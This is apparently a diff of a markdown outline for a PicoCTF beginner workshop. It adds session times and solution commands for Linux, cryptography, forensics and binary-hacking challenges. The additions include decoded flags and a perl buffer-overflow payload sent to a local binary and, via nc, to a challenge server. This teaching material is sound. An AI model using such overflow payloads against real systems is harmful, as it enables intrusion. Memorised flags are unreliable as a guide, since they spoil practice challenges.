@@ -4,7 +4,7 @@ https://tinyurl.com/y4stu63n
 ## Title: CTF Crash Course with PicoCTF
 #### PicoCTF Registration Link
 `https://play.picoctf.org/register`
-### Part 1: Navigating the Linux Terminal
+### Part 1: Navigating the Linux Terminal (9:40 AM)
 * Downloading files
   * Pico - Obedient Cat https://play.picoctf.org/practice/challenge/147
     * key commands - `wget` `ls` `cat`
@@ -37,7 +37,7 @@ cd ~
 ls
 cat 3of3.flag.txt
 ```
-### Part 2: Python Programming for Beginners
+### Part 2: Python Programming for Beginners (10:30 AM)
 #### Website for testing out Python code
 `https://www.online-python.com/`
 * running Python scripts
@@ -66,7 +66,7 @@ ls
 python serpentine.py
 nano serpentine.py
 ```
-### Part 3: Intro to Cryptography
+### Part 3: Intro to Cryptography (11:15 AM)
 * Base64 encoding
   * Repetitions https://play.picoctf.org/practice/challenge/371
     * key commands `wget` `base64`
@@ -118,19 +118,56 @@ echo 'cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
 echo 'cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzk2RjU4REFCfQ%3D%3D' | base64 -d
 ```
-### Part 5: Intro to Digital Forensics
+### Part 5: Intro to Digital Forensics (12:45 PM)
 * Picture File Forensics
   * Pico - Information https://play.picoctf.org/practice/challenge/186
-    * key commands
+    * key commands `wget` `exiftool` `base64`
+```
+wget https://mercury.picoctf.net/static/b4d62f6e431dc8e563309ea8c33a06b3/cat.jpg
+ls
+exiftool cat.jpg
+echo 'cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9' | base64 -d
+``` 
   * Pico - Glory of the Garden https://play.picoctf.org/practice/challenge/44
-    * key commands
+    * key commands `wget` `strings`
+```
+wget https://jupiter.challenges.picoctf.org/static/d0e1ffb10fc0017c6a82c57900f3ffe3/garden.jpg
+strings garden.jpg
+```
 * Disk Image Forensics
   * Pico - SleuthKit Apprentice https://play.picoctf.org/practice/challenge/300
-### Part 6: Intro to Binary Hacking
+    * key commands: `wget` `mkdir` `gunzip` `fsstat` `fls` `icat`
+```
+mkdir /tmp/sa_your_user_name
+cd /tmp/sa_your_user_name
+wget https://artifacts.picoctf.net/c/137/disk.flag.img.gz
+gunzip disk.flag.img.gz
+mmls disk.flag.img
+fsstat -o 360448 disk.flag.img
+fls -f ext4 -o 360448 -r disk.flag.img
+icat -f ext4 -o 360448 -r disk.flag.img 2371
+```
+### Part 6: Intro to Binary Hacking (1:45 PM)
 * Program Logic Flaws
   * Pico RPS https://play.picoctf.org/practice/challenge/293
+    * key commands: `wget` `nc` `nano`
+```
+wget https://artifacts.picoctf.net/c/147/game-redacted.c
+nano game-redacted.c
+nc saturn.picoctf.net <port_number>
+```
+We have to figure out how the program decided the computer loses the RPS game, and how the strstr function works in C language
 * Buffer Overflow Vulnerabilities
   * Pico Clutter Overflow https://play.picoctf.org/practice/challenge/216
+    * key commands: `wget` `nano` `echo` `perl`
+```
+wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c
+wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall
+nano chall.c
+echo 'we got the flag!' > flag.txt
+perl -e 'print "A" x 264 . "\xef\xbe\xad\xde\x0a"' | ./chall
+perl -e 'print "A" x 264 . "\xef\xbe\xad\xde\x0a"' | nc mars.picoctf.net 31890
+```
 ### Appendix: Further Learning Resources
 * Linux OS Operations
   * Overthewire - Bandit CTF Game https://overthewire.org/wargames/bandit/
